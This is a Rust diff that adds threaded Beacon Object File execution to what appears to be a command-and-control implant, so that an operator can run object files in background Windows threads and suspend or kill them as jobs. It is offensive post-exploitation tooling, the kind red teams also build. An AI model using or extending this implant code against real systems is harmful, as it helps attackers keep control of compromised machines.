@@ -616,6 +616,88 @@ pub fn coffee_execute(
     }
 }
 
+// ─── Threaded BOF execution ─────────────────────────────────────────────────
+
+/// Parameters transferred to a BOF thread created by [`coffee_execute_threaded`].
+#[cfg(windows)]
+struct BofThreadArgs {
+    function_name: String,
+    object_data: Vec<u8>,
+    arg_data: Vec<u8>,
+}
+
+/// Thread entry point for threaded BOF execution.
+///
+/// # Safety
+///
+/// `param` must point to a `Box<BofThreadArgs>` that was leaked by
+/// [`coffee_execute_threaded`].  Ownership is reclaimed here.
+#[cfg(windows)]
+#[allow(unsafe_code)]
+unsafe extern "system" fn bof_thread_entry(param: *mut std::ffi::c_void) -> u32 {
+    // SAFETY: param is a Box<BofThreadArgs> leaked in coffee_execute_threaded.
+    let args = unsafe { Box::from_raw(param.cast::<BofThreadArgs>()) };
+    // Output is not yet forwarded to the teamserver — a follow-up issue will
+    // add an async output channel for background BOF results.
+    let _ = coffee_execute(&args.function_name, &args.object_data, &args.arg_data, false);
+    0
+}
+
+/// Spawn a BOF in a new Windows thread and return the thread `HANDLE`.
+///
+/// The returned handle (as `isize`) should be registered in a
+/// [`crate::job::JobStore`] so the operator can suspend, resume, or kill the
+/// thread via `CommandJob`.  Ownership of the handle is transferred to the
+/// caller; close it (or let `JobStore::kill` do so) when the job is done.
+///
+/// Returns `None` if `CreateThread` fails; in that case the argument memory is
+/// reclaimed and no thread is started.
+#[cfg(windows)]
+#[allow(unsafe_code)]
+pub fn coffee_execute_threaded(
+    function_name: String,
+    object_data: Vec<u8>,
+    arg_data: Vec<u8>,
+) -> Option<isize> {
+    let args = Box::new(BofThreadArgs { function_name, object_data, arg_data });
+    let param = Box::into_raw(args).cast::<std::ffi::c_void>();
+
+    // SAFETY: param points to a valid Box<BofThreadArgs>; the thread
+    // reclaims it via Box::from_raw in bof_thread_entry.
+    let handle = unsafe {
+        windows_sys::Win32::System::Threading::CreateThread(
+            std::ptr::null(),
+            0,
+            Some(bof_thread_entry),
+            param,
+            0,
+            std::ptr::null_mut(),
+        )
+    };
+
+    if handle == 0 {
+        // CreateThread failed — reclaim to prevent a memory leak.
+        // SAFETY: param still points to our Box<BofThreadArgs>, thread was not started.
+        unsafe { drop(Box::from_raw(param.cast::<BofThreadArgs>())) };
+        None
+    } else {
+        Some(handle)
+    }
+}
+
+/// Non-Windows stub: threaded BOF execution is unsupported.
+///
+/// Always returns `None`; callers should fall back to synchronous execution.
+#[cfg(not(windows))]
+pub fn coffee_execute_threaded(
+    _function_name: String,
+    _object_data: Vec<u8>,
+    _arg_data: Vec<u8>,
+) -> Option<isize> {
+    warn!("Threaded BOF execution is only supported on Windows");
+    None
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -653,5 +735,12 @@ mod tests {
         let result = coffee_execute("go", &[0u8; 100], &[], false);
         assert_eq!(result.callbacks.len(), 1);
         assert_eq!(result.callbacks[0].callback_type, BOF_COULD_NOT_RUN);
+    }
+
+    #[cfg(not(windows))]
+    #[test]
+    fn threaded_non_windows_stub_returns_none() {
+        let result = coffee_execute_threaded("go".to_string(), vec![0u8; 20], vec![]);
+        assert!(result.is_none());
     }
 }
